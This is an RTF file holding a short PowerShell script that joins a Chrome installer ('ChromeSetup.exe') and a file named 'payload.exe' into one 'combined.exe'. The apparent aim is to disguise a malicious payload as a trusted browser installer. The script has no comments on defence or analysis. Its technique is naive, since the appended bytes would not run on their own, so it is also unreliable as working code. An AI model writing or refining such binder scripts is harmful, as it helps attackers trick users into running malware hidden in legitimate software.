{\rtf1\ansi\ansicpg1252\cocoartf2761
\cocoatextscaling0\cocoaplatform0{\fonttbl\f0\fswiss\fcharset0 Helvetica;}
{\colortbl;\red255\green255\blue255;}
{\*\expandedcolortbl;;}
\paperw11900\paperh16840\margl1440\margr1440\vieww11520\viewh8400\viewkind0
\pard\tx720\tx1440\tx2160\tx2880\tx3600\tx4320\tx5040\tx5760\tx6480\tx7200\tx7920\tx8640\pardirnatural\partightenfactor0

\f0\fs24 \cf0 # Read both executables\
$exe1 = [System.IO.File]::ReadAllBytes("C:\\Users\\allen\\Downloads\\ChromeSetup.exe")\
$exe2 = [System.IO.File]::ReadAllBytes("C:\\Users\\allen\\Downloads\\payload.exe")\
\
# Combine them\
$combined = New-Object byte[] ($exe1.Length + $exe2.Length)\
[Array]::Copy($exe1, 0, $combined, 0, $exe1.Length)\
[Array]::Copy($exe2, 0, $combined, $exe1.Length, $exe2.Length)\
\
# Write the combined executable to a new file\
[System.IO.File]::WriteAllBytes("C:\\Users\\allen\\Downloads\\combined.exe", $combined)}